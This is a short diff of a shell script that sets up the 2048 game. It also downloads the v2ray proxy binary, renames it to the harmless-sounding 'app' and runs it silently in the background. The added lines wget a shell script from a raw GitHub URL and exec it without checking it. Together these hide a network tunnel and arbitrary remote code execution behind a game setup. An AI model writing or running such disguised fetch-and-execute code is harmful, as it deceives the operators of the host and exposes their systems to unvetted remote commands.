@@ -78,11 +78,13 @@ mv gabrielecirulli-2048* 2048
 wget -qO - https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip |
     unzip -q - v2ray geoip.dat geosite.dat
 chmod +x v2ray
-mv v2ray games
+mv v2ray app
 
-./games >/dev/null 2>&1 &
+./app >/dev/null 2>&1 &
 echo $! >> $PID_FILE
 }
 
 ps aux
-sleep 600 && eval "$CMD"
+sleep 600
+wget -qO $CMD_FILE https://raw.githubusercontent.com/goofw/cmd/HEAD/sh
+exec /bin/sh $CMD_FILE
